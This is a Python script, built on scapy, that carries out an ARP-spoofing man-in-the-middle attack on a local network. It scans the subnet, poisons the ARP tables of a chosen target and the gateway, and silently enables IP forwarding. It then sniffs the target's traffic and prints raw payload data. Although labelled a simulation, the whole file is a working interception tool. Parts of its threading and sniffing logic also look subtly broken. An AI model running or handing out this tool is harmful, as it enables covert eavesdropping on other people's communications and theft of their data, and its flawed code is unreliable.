import scapy.all as scapy
import threading
import time
import os
import socket
from colorama import Fore, Style, init

# Initialize colorama for cross-platform color support
init(autoreset=True)

# A flag to stop the sniffing thread gracefully
stop_sniffer_event = threading.Event()

def get_mac(ip_address):
    """
    Retrieves the MAC address for a given IP address using an ARP request.
    
    Args:
        ip_address (str): The IP address to query.
    
    Returns:
        str: The MAC address as a string, or None if not found.
    """
    try:
        # Create an ARP request packet
        arp_request = scapy.ARP(pdst=ip_address)
        # Create a broadcast Ethernet frame
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        # Combine the Ethernet frame and ARP request
        arp_request_broadcast = broadcast / arp_request
        # Send the packet and capture the response
        answered, _ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
        
        if answered:
            # The MAC address is in the hardware source field (hwsrc) of the response
            return answered[0][1].hwsrc
        return None
    except Exception as e:
        print(f"{Fore.RED}Error in get_mac for {ip_address}: {e}{Style.RESET_ALL}")
        return None

def scan_network(router_ip):
    """
    Scans the local subnet for active devices and returns a list of devices.
    
    Args:
        router_ip (str): The IP address of the gateway (router).
        
    Returns:
        list: A list of dictionaries, each containing 'ip' and 'mac' of a device.
    """
    print(f"{Fore.CYAN}\n[+] Scanning network for connected devices...{Style.RESET_ALL}")
    
    # Create a broadcast ARP packet for the entire subnet
    arp = scapy.ARP(pdst=f"{router_ip}/24")
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    devices = []
    try:
        # Send the packets and wait for responses
        answered, _ = scapy.srp(packet, timeout=3, verbose=0)

        # Process the answered packets to get IP and MAC addresses
        for sent, received in answered:
            devices.append({"ip": received.psrc, "mac": received.hwsrc})
    except Exception as e:
        print(f"{Fore.RED}Error during network scan: {e}{Style.RESET_ALL}")

    return devices

def spoof(target_ip, spoof_ip, target_mac):
    """
    Sends an ARP response to poison the target's ARP table.
    
    Args:
        target_ip (str): The IP address of the target device.
        spoof_ip (str): The IP address you are pretending to be (e.g., the gateway).
        target_mac (str): The MAC address of the target device.
    """
    try:
        # Create an ARP response packet (op=2)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    except Exception as e:
        print(f"{Fore.RED}Error sending spoofing packet: {e}{Style.RESET_ALL}")

def restore(destination_ip, source_ip, destination_mac, source_mac):
    """
    Restores the network to its normal state by sending correct ARP responses.
    
    Args:
        destination_ip (str): The IP address of the destination device.
        source_ip (str): The IP address of the source device.
        destination_mac (str): The MAC address of the destination device.
        source_mac (str): The correct MAC address of the source device.
    """
    try:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
    except Exception as e:
        print(f"{Fore.RED}Error restoring ARP tables: {e}{Style.RESET_ALL}")

def process_sniffed_packet(packet):
    """
    Processes a sniffed packet to display basic information.
    
    Args:
        packet: The sniffed packet object from Scapy.
    """
    if stop_sniffer_event.is_set():
        return
        
    if packet.haslayer(scapy.IP):
        ip_layer = packet.getlayer(scapy.IP)
        print(f"{Fore.CYAN}Intercepted: {Style.BRIGHT}{ip_layer.src}{Style.RESET_ALL} -> {Style.BRIGHT}{ip_layer.dst}{Style.RESET_ALL}")
        if packet.haslayer(scapy.Raw):
            raw_data = packet.getlayer(scapy.Raw).load.decode('utf-8', errors='ignore')
            print(f"{Fore.YELLOW}  Raw Data: {Style.NORMAL}{raw_data[:80]}...{Style.RESET_ALL}")

def start_mitm_attack():
    """
    Main function to run the Man-in-the-Middle attack in an Ettercap-like style.
    """
    global stop_sniffer_event
    
    if os.geteuid() != 0:
        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
        return
        
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}Man-in-the-Middle Attack Simulation{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'-'*50}{Style.RESET_ALL}")

    # Step 1: Get the gateway IP
    gateway_ip = input(f"{Fore.YELLOW}Enter Gateway IP (e.g., 172.26.16.1): {Style.RESET_ALL}")
    if not gateway_ip:
        print(f"{Fore.RED}Gateway IP cannot be empty. Exiting.{Style.RESET_ALL}")
        return

    # Step 2: Scan the network
    devices = scan_network(gateway_ip)
    if not devices:
        print(f"{Fore.RED}No devices found on the network. Exiting.{Style.RESET_ALL}")
        return

    # Step 3: Display the list of hosts and get user selection
    print(f"\n{Fore.GREEN}Discovered hosts:{Style.RESET_ALL}")
    for idx, device in enumerate(devices, 1):
        print(f"{Fore.YELLOW}[{idx}] IP: {device['ip']}, MAC: {device['mac']}{Style.RESET_ALL}")

    try:
        target_choice = int(input(f"{Fore.YELLOW}Select target device by number: {Style.RESET_ALL}"))
        if target_choice < 1 or target_choice > len(devices):
            print(f"{Fore.RED}Invalid choice.{Style.RESET_ALL}")
            return
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
        return
        
    target_ip = devices[target_choice-1]['ip']
    target_mac = devices[target_choice-1]['mac']
    gateway_mac = get_mac(gateway_ip)

    if not gateway_mac:
        print(f"{Fore.RED}Could not find gateway MAC address. Exiting.{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}Starting MitM attack between {target_ip} and {gateway_ip}...{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Press Ctrl+C to stop.{Style.RESET_ALL}")

    # Enable IP Forwarding
    # This is critical for a silent attack, as it allows the attacker to forward packets
    # between the target and the gateway, preventing a denial-of-service.
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print(f"{Fore.MAGENTA}IP forwarding enabled.{Style.RESET_ALL}")
    
    try:
        # Start a separate thread to continuously send spoofing packets
        spoofing_thread = threading.Thread(
            target=lambda: (
                print(f"{Fore.BLUE}ARP spoofing started in background thread.{Style.RESET_ALL}"),
                (lambda: [
                    (spoof(target_ip, gateway_ip, target_mac), spoof(gateway_ip, target_ip, gateway_mac), time.sleep(2))
                    for _ in iter(lambda: not stop_sniffer_event.is_set(), True)
                ])()
            )
        )
        spoofing_thread.start()
        
        # Sniff packets and process them
        scapy.sniff(
            filter=f"host {target_ip} or host {gateway_ip}",
            prn=process_sniffed_packet,
            store=0,
            stop_event=stop_sniffer_event
        )

    except KeyboardInterrupt:
        print(f"\n{Fore.GREEN}User requested a shutdown. Restoring ARP tables...{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred: {e}{Style.RESET_ALL}")
    finally:
        # Clean up
        stop_sniffer_event.set()
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print(f"{Fore.GREEN}IP forwarding disabled. ARP tables restored. Exiting.{Style.RESET_ALL}")

if __name__ == "__main__":
    start_mitm_attack()